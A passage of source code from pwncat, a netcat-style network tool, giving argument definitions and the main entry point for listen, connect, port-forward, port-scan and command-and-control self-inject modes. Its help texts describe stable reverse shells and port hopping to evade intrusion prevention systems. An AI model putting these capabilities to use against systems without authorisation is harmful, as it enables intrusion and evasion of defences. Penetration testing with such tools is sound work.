A Python scripting engine to define your own custom
transformer function which will be executed after
receiving data from a remote endpoint. Your file must
contain the exact following function which will:
be applied as the transformer:
def transform(data, pse):
    # NOTE: the function name must be 'transform'
    # NOTE: the function param name must be 'data'
    # NOTE: indentation must be 4 spaces
    # ... your transformations goes here
    return data
You can also define as many custom functions or classes
within this file, but ensure to prefix them uniquely to
not collide with pwncat's function or classes, as the
file will be called with exec().
""",
    )

    # --------------------------------------------------------------------------
    # Zero-I/O mode arguments
    # --------------------------------------------------------------------------
    zero.add_argument(
        "--banner",
        action="store_true",
        default=False,
        help="""Zero-I/O (TCP and UDP):
Try banner grabbing during port scan.
""",
    )

    # --------------------------------------------------------------------------
    # Listen mode arguments
    # --------------------------------------------------------------------------
    lmode.add_argument(
        "-k",
        "--keep-open",
        action="store_true",
        default=False,
        help="""Listen mode (TCP only):
Re-accept new clients in listen mode after a client has
disconnected or the connection is interrupted otherwise.
(default: server will quit after connection is gone)

""",
    )
    lmode.add_argument(
        "--rebind",
        metavar="x",
        nargs="?",
        type=int,
        default=0,
        help="""Listen mode (TCP and UDP):
If the server is unable to bind, it will re-initialize
itself x many times before giving up. Omit the
quantifier to rebind endlessly or specify a positive
integer for how many times to rebind before giving up.
See --rebind-robin for an interesting use-case.
(default: fail after first unsuccessful try).

""",
    )
    lmode.add_argument(
        "--rebind-wait",
        metavar="s",
        type=float,
        default=1.0,
        help="""Listen mode (TCP and UDP):
Wait x seconds between re-initialization. (default: 1)

""",
    )
    lmode.add_argument(
        "--rebind-robin",
        metavar="port",
        type=ArgValidator.type_port_list,
        default=[],
        help="""Listen mode (TCP and UDP):
If the server is unable to initialize (e.g: cannot bind
and --rebind is specified, it it will shuffle ports in
round-robin mode to bind to.
Use comma separated string such as '80,81,82,83', a range
of ports '80-83' or an increment '80+3'.
Set --rebind to at least the number of ports to probe +1
This option requires --rebind to be specified.
""",
    )

    # --------------------------------------------------------------------------
    # Connect mode arguments
    # --------------------------------------------------------------------------
    cmode.add_argument(
        "--source-addr",
        metavar="addr",
        type=str,
        default=None,
        dest="source_addr",
        help="""Specify source bind IP address for connect mode.

""",
    )
    cmode.add_argument(
        "--source-port",
        metavar="port",
        type=ArgValidator.type_port,
        default=None,
        dest="source_port",
        help="""Specify source bind port for connect mode.

""",
    )
    cmode.add_argument(
        "--reconn",
        metavar="x",
        nargs="?",
        type=int,
        default=0,
        help="""Connect mode (TCP and UDP):
If the remote server is not reachable or the connection
is interrupted, the client will connect again x many
times before giving up. Omit the quantifier to retry
endlessly or specify a positive integer for how many
times to retry before giving up.
(default: quit if the remote is not available or the
connection was interrupted)
This might be handy for stable TCP reverse shells ;-)
Note on UDP:
By default UDP does not know if it is connected, so
it will stop at the first port and assume it has a
connection. Consider using --udp-sconnect with this
option to make UDP aware of a successful connection.

""",
    )
    cmode.add_argument(
        "--reconn-wait",
        metavar="s",
        type=float,
        default=1.0,
        help="""Connect mode (TCP and UDP):
Wait x seconds between re-connects. (default: 1)

""",
    )
    cmode.add_argument(
        "--reconn-robin",
        metavar="port",
        type=ArgValidator.type_port_list,
        default=[],
        help="""Connect mode (TCP and UDP):
If the remote server is not reachable or the connection
is interrupted and --reconn is specified, the client
will shuffle ports in round-robin mode to connect to.
Use comma separated string such as '80,81,82,83', a range
of ports '80-83' or an increment '80+3'.
Set --reconn to at least the number of ports to probe +1
This helps reverse shell to evade intrusiona prevention
systems that will cut your connection and block the
outbound port.
This is also useful in Connect or Zero-I/O mode to
figure out what outbound ports are allowed.

""",
    )
    cmode.add_argument(
        "--ping-init",
        action="store_true",
        default=False,
        help="""Connect mode (TCP and UDP):
UDP is a stateless protocol unlike TCP, so no hand-
shake communication takes place and the client just
sends data to a server without being "accepted" by
the server first.
This means a server waiting for an UDP client to
connect to, is unable to send any data to the client,
before the client hasn't send data first. The server
simply doesn't know the IP address before an initial
connect.
The --ping-init option instructs the client to send one
single initial ping packet to the server, so that it is
able to talk to the client.
This is a way to make a UDP reverse shell work.
See --ping-word for what char/string to send as initial
ping packet (default: '\\0')

""",
    )
    cmode.add_argument(
        "--ping-intvl",
        metavar="s",
        type=int,
        default=False,
        help="""Connect mode (TCP and UDP):
Instruct the client to send ping intervalls every s sec.
This allows you to restart your UDP server and just wait
for the client to report back in. This might be handy
for stable UDP reverse shells ;-)
See --ping-word for what char/string to send as initial
ping packet (default: '\\0')

""",
    )
    cmode.add_argument(
        "--ping-word",
        metavar="str",
        type=str,
        default="\0",
        help="""Connect mode (TCP and UDP):
Change the default character '\\0' to use for upd ping.
Single character or strings are supported.

""",
    )
    # TODO: Isn't this already covered by --reconn-robin or --zero
    # What should be the behaviour (keep connection or hop on?)
    cmode.add_argument(
        "--ping-robin",
        metavar="port",
        type=ArgValidator.type_port_list,
        default=[],
        help="""Connect mode (TCP and UDP):
Instruct the client to shuffle the specified ports in
round-robin mode for a remote server to ping.
This might be handy to scan outbound allowed ports.
Use comma separated string such as '80,81,82,83', a range
of ports '80-83' or an increment '80+3'.
Use --ping-intvl 0 to be faster.

""",
    )
    cmode.add_argument(
        "--udp-sconnect",
        action="store_true",
        default=False,
        help="""Connect mode (UDP only):
Emulating stateful behaviour for UDP connect phase by
sending an initial packet to the server to validate if
it is actually connected.
By default, UDP will simply issue a connect and is not
aware if it is really connected or not.
The default connect packet to be send is '\\0', you
can change this with --udp-sconnect-word.

""",
    )
    cmode.add_argument(
        "--udp-sconnect-word",
        nargs="?",
        metavar="str",
        type=str,
        default="\0",
        help="""Connect mode (UDP only):
Change the the data to be send for UDP stateful connect
behaviour. Note you can also omit the string to send an
empty packet (EOF), but be aware that some servers such
as netcat will instantly quit upon receive of an EOF
packet.
The default is to send a null byte sting: '\\0'.
""",
    )

    # --------------------------------------------------------------------------
    # Misc arguments
    # --------------------------------------------------------------------------
    misc.add_argument("-h", "--help", action="help", help="Show this help message and exit")
    misc.add_argument(
        "-V",
        "--version",
        action="version",
        version=get_version(),
        help="Show version information and exit",
    )

    # Retrieve arguments
    args = parser.parse_args()

    # Check mutually exclive arguments
    _args_check_mutually_exclusive(parser, args)

    # Only Zero-I/O mode allows multiple ports
    if not args.zero and len(args.port) > 1:
        parser.print_usage()
        print(
            "%s: error: Only Zero-I/O mode supports multiple ports" % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # Connect mode and Zero-I/O mode require hostname and port to be set
    connect_mode = not (args.listen or args.zero or args.local or args.remote)
    if (connect_mode or args.zero or args.local) and not args.hostname:
        parser.print_usage()
        print(
            "%s: error: the following arguments are required: hostname" % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # Deny unimplemented modes
    if args.https:
        print("Unimplemented options", file=sys.stderr)
        sys.exit(1)

    return args


# #################################################################################################
# #################################################################################################
# ###
# ###   11 / 11   M A I N   E N T R Y P O I N T
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [11/11 MAIN ENTRYPOINT]: (1/2) main
# -------------------------------------------------------------------------------------------------
def main():
    # type: () -> None
    """Run the program."""
    args = get_args()

    # Determine current mode
    mode = None
    if not (args.listen or args.local or args.remote or args.zero):
        mode = "connect"
        ports = [args.port[0]]
    elif args.listen:
        mode = "listen"
        ports = [args.port[0]]
    elif args.local:
        mode = "local"
        ports = [args.port[0]]
    elif args.remote:
        mode = "remote"
        ports = [args.port[0]]
    elif args.zero:
        mode = "scan"
        ports = args.port
    assert mode is not None

    host = args.hostname

    # No argument supplied --udp-sconnect-word to it
    if args.udp_sconnect_word is None:
        udp_sconnect_word = ""
    # --udp-sconnect-word not specified
    elif args.udp_sconnect_word == "":
        udp_sconnect_word = "\0"
    else:
        udp_sconnect_word = args.udp_sconnect_word

    reconn = -1 if args.reconn is None else args.reconn
    rebind = -1 if args.rebind is None else args.rebind

    # Set pwncat options
    sock_opts = DsIONetworkSock(
        RECV_BUFSIZE,
        LISTEN_BACKLOG,
        TIMEOUT_RECV_SOCKET,
        TIMEOUT_RECV_SOCKET_RETRY,
        args.nodns,
        args.ipv4,
        args.ipv6,
        args.source_addr,
        args.source_port,
        args.udp,
        True if args.zero else args.udp_sconnect,
        udp_sconnect_word,
        args.tos,
        args.info,
    )
    srv_opts = DsIONetworkSrv(args.keep_open, rebind, args.rebind_wait, args.rebind_robin)
    cli_opts = DsIONetworkCli(reconn, args.reconn_wait, args.reconn_robin)

    # Map pwncat verbosity to Python's Logger loglevel
    logmap = {
        0: logging.ERROR,
        1: logging.WARNING,
        2: logging.INFO,
        3: logging.DEBUG,
    }
    loglevel = logmap.get(args.verbose, TraceLogger.LEVEL_NUM)

    # Use a colored log formatter
    formatter = ColoredLogFormatter(args.color, loglevel)
    handler = logging.StreamHandler()
    handler.setLevel(loglevel)
    handler.setFormatter(formatter)

    # Use a custom logger with TRACE level
    logging.setLoggerClass(TraceLogger)
    logger = logging.getLogger(__name__)
    logger.setLevel(loglevel)
    logger.addHandler(handler)

    # Initialize encoder
    enc = StringEncoder()

    # Initialize interrupt handler
    ssig = InterruptHandler(args.keep_open, args.no_shutdown)

    # Initialize transformers
    transformers = []
    if args.safe_word is not None:
        transformers.append(TransformSafeword(DsTransformSafeword(ssig, args.safe_word)))
    if args.crlf is not None:
        transformers.append(TransformLinefeed(DsTransformLinefeed(args.crlf)))

    # Initialize scripting engine transformers
    code_send = None
    code_recv = None
    if args.script_send is not None:
        code_send = compile(args.script_send, "<script-send>", "exec")
    if args.script_recv is not None:
        code_recv = compile(args.script_recv, "<script-recv>", "exec")

    # Use command modulde
    if args.cmd:
        mod = IOCommand(ssig, DsIOCommand(enc, args.cmd, POPEN_BUFSIZE))
    # Use output module
    else:
        mod = IOStdinStdout(ssig, DsIOStdinStdout(enc, TIMEOUT_READ_STDIN, args.send_on_eof))

    # Run local port-forward
    # -> listen locally and forward traffic to remote (connect)
    if mode == "local":
        # Enure to re-connect forever during local port forward
        cli_opts.reconn = -1
        cli_opts.reconn_wait = 0.0
        srv_opts.keep_open = True
        lhost = args.local.split(":")[0]
        lport = int(args.local.split(":")[1])
        if not lhost:
            lhost = None
        # Create listen and client instances
        net_srv = IONetwork(ssig, enc, lhost, [lport], "server", srv_opts, cli_opts, sock_opts)
        net_cli = IONetwork(ssig, enc, host, ports, "client", srv_opts, cli_opts, sock_opts)
        # Create Runner
        run = Runner(ssig, False, PSEStore(ssig, [net_srv, net_cli]))
        run.add_action(
            "TRANSMIT",
            DsRunnerAction(
                DsCallableProducer(net_srv.producer),  # (recv) USER sends data to PC-SERVER
                net_cli.consumer,  # (send) Data parsed on to PC-CLIENT to send to TARGET
                [net_cli.interrupt, net_srv.interrupt],
                transformers,
                False,
                None,
            ),
        )
        run.add_action(
            "RECEIVE",
            DsRunnerAction(
                DsCallableProducer(net_cli.producer),  # (recv) Data back from TARGET to PC-CLIENT
                net_srv.consumer,  # (send) Data parsed on to PC-SERVER to back send to USER
                [net_cli.interrupt, net_srv.interrupt],
                transformers,
                False,
                None,
            ),
        )
        run.run()

    # Run remote port-forward
    # -> connect to client, connect to target and proxy traffic in between.
    if mode == "remote":
        # TODO: Make the listen address optional!
        # Enure to re-connect forever during remote port forward
        cli_opts.reconn = -1
        cli_opts.reconn_wait = 0.0
        lhost = args.remote.split(":")[0]
        lport = int(args.remote.split(":")[1])
        # Create local and remote client
        net_cli_l = IONetwork(ssig, enc, lhost, [lport], "client", srv_opts, cli_opts, sock_opts)
        net_cli_r = IONetwork(ssig, enc, host, ports, "client", srv_opts, cli_opts, sock_opts)
        # Create Runner
        run = Runner(ssig, False, PSEStore(ssig, [net_cli_l, net_cli_r]))
        run.add_action(
            "TRANSMIT",
            DsRunnerAction(
                DsCallableProducer(net_cli_l.producer),  # (recv) USER sends data to PC-SERVER
                net_cli_r.consumer,  # (send) Data parsed on to PC-CLIENT to send to TARGET
                [],
                transformers,
                False,
                None,
            ),
        )
        run.add_action(
            "RECEIVE",
            DsRunnerAction(
                DsCallableProducer(net_cli_r.producer),  # (recv) Data back from TARGET to PC-CLIENT
                net_cli_l.consumer,  # (send) Data parsed on to PC-SERVER to back send to USER
                [],
                transformers,
                False,
                None,
            ),
        )
        run.run()

    # Port Scan
    if mode == "scan":
        print("Scanning {} ports".format(len(ports)))
        net = IONetworkScanner(ssig, enc, host, args.banner, cli_opts, sock_opts)
        run = Runner(ssig, True, PSEStore(ssig, [net]))
        for port in ports:
            run.add_action(
                "PORT-{}".format(port),
                DsRunnerAction(
                    DsCallableProducer(net.producer, port),  # Send port scans
                    net.consumer,  # Output results
                    [net.interrupt],
                    [],
                    True,
                    None,
                ),
            )
        run.run()

    # Run server
    if mode == "listen":
        net = IONetwork(
            ssig, enc, host, ports + args.rebind_robin, "server", srv_opts, cli_opts, sock_opts
        )
        # Run blocking auto-deploy.
        # This will hand over to normal listening server on success or failure
        if args.self_inject:
            cnc_cmd, cnc_host, cnc_port = args.self_inject.split(":")
            cnc_ports = ArgValidator.get_port_list_from_string(cnc_port)
            CNCAutoDeploy(net, cnc_cmd, cnc_host, cnc_ports)

        if args.http:
            trans_recv = [TransformHttpUnpack({})] + transformers
            trans_send = [TransformHttpPack({"host": host, "reply": "response"})] + transformers
        else:
            trans_recv = transformers
            trans_send = transformers

        run = Runner(ssig, False, PSEStore(ssig, [net]))
        run.add_action(
            "RECV",
            DsRunnerAction(
                DsCallableProducer(net.producer),  # receive data
                mod.consumer,
                [net.interrupt],
                trans_recv,
                False,
                code_recv,
            ),
        )
        run.add_action(
            "STDIN",
            DsRunnerAction(
                DsCallableProducer(mod.producer),
                net.consumer,  # send data
                [mod.interrupt],
                trans_send,
                False,
                code_send,
            ),
        )
        run.run()

    # Run client
    if mode == "connect":
        net = IONetwork(
            ssig, enc, host, ports + args.reconn_robin, "client", srv_opts, cli_opts, sock_opts
        )

        if args.http:
            trans_recv = [TransformHttpUnpack({})] + transformers
            trans_send = [TransformHttpPack({"host": host, "reply": "response"})] + transformers
        else:
            trans_recv = transformers
            trans_send = transformers

        run = Runner(ssig, False, PSEStore(ssig, [net]))
        run.add_action(
            "RECV",
            DsRunnerAction(
                DsCallableProducer(net.producer),  # receive data
                mod.consumer,
                [net.interrupt],
                trans_recv,
                False,
                code_recv,
            ),
        )
        run.add_action(
            "STDIN",
            DsRunnerAction(
                DsCallableProducer(mod.producer),
                net.consumer,  # send data
                [mod.interrupt],
                trans_send,
                False,
                code_send,
            ),
        )
        if type(args.ping_intvl) is int and args.ping_intvl > 0:
            payload = StringEncoder.encode(args.ping_word)
            run.add_timer(
                "PING-INT",
                DsRunnerTimer(net.consumer, ssig, args.ping_intvl, (payload,), {}),  # send data
            )
        if args.ping_init:
            payload = StringEncoder.encode(args.ping_word)
            run.add_repeater(
                "PING-REP",
                DsRunnerRepeater(net.consumer, ssig, 1, 0.0, (payload,), {}),  # send data
            )
        run.run()


# -------------------------------------------------------------------------------------------------
# [11/11 MAIN ENTRYPOINT]: (2/2) start
# -------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    main()
